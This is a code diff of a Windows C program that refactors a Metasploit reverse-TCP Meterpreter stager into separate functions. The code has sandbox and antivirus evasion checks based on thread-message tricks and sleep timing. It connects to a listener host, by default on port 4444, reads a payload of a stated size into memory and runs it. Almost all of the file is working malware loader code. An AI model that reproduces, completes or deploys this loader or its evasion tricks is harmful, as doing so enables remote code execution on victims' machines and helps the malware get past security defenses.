@@ -2,7 +2,17 @@
 #include <stdlib.h>
 #include <windows.h>
 #include <winsock2.h>
-#include <string.h>
+
+//Function Headers
+void winsock_init();
+void Kick(SOCKET my_socket, char * error);
+void genlol();
+int recv_all(SOCKET my_socket, void * buffer, int len);
+SOCKET wsconnect(char * targetip, int port);
+int random_in_range (unsigned int min, unsigned int max);
+char* rev(char* str);
+int sandbox_evasion();
+inline void reverse_tcp_meterpreter(char * listenerIP,unsigned int listenerPort);
 
 void winsock_init() {
 	WSADATA	wsaData;
@@ -69,7 +79,9 @@ SOCKET wsconnect(char * targetip, int port) {
 int random_in_range (unsigned int min, unsigned int max)
 {
   int base_random = rand(); /* in [0, RAND_MAX] */
-  if (RAND_MAX == base_random) return random_in_range(min, max);
+  if (RAND_MAX == base_random){
+	  return random_in_range(min, max);
+  }
   /* now guaranteed to be in [0, RAND_MAX) */
   int range       = max - min,
       remainder   = RAND_MAX % range,
@@ -95,17 +107,8 @@ char* rev(char* str)
   return str;
 }
 
-
-int main(int argc, char *argv[]) {
-	ULONG32 size;
-	char * buffer;
-	void (*function)();
-	winsock_init();
-
-	//this program was meant to be run from the command line, so i added this so it would work
-	char * defaultListenerIP = "ListenerIP";
-	unsigned int defaultListenerPort = 4444;
-
+//Evade the sandbox
+int sandbox_evasion(){
 	//================================
 	//begin sandbox evasssioooooon
 	MSG msg;
@@ -114,25 +117,29 @@ int main(int argc, char *argv[]) {
 	//see this post for more info http://schierlm.users.sourceforge.net/avevasion.html
 	PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);
 	if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0))
-		return 0;
+		return -1;
 	if (msg.message != WM_USER+2 || msg.wParam != 23 || msg.lParam != 42)
-		return 0;
+		return -1;
 	//record the ticks, then sleep, then count the ticks.... this verifies that we actually slept for 650
 	//this helps burn out the clock on the sandboxing, or detect if sandboxing is converting sleeps to nops
 	tc = GetTickCount();
 	Sleep(650);
 	if (((GetTickCount() - tc) / 300) != 2)
-		return 0;
+		return -1;
 	//=================================
+	return 0;
+}
+
+
+//The metasploit-loader extracted into its own function.
+void reverse_tcp_meterpreter(char * listenerIP,unsigned int listenerPort){
+	ULONG32 size;
+	char * buffer;
+	void (*function)();
+	winsock_init();
 
 	//start the socket homie
-	SOCKET my_socket;
-	//If command line parameters are given, use those instead of defaults.
-	if(argc == 3){
-		my_socket = wsconnect(argv[1], atoi(argv[2]));
-	}else{
-		my_socket = wsconnect(defaultListenerIP, defaultListenerPort);
-	}
+	SOCKET my_socket = wsconnect(listenerIP, listenerPort);
 	//receive 4 bytes which indicates the size of the next payload
 	int count = recv(my_socket, (char *)&size, 4, 0);
 	//check for issues
@@ -178,5 +185,21 @@ int main(int argc, char *argv[]) {
 	function = (void (*)())buffer;
 	//execute dat meterpreter
 	function();
+}
+
+int main(int argc, char *argv[]) {
+	//this program was meant to be run from the command line, so i added this so it would work
+	char * defaultListenerIP = "ListenerIP";
+	unsigned int defaultListenerPort = 4444;
+
+	sandbox_evasion();
+
+	//If command line parameters are given, use those instead of defaults.
+	if(argc == 3){
+		reverse_tcp_meterpreter(argv[1], atoi(argv[2]));
+	}else{
+		reverse_tcp_meterpreter(defaultListenerIP, defaultListenerPort);
+	}
+
 	return 0;
 }
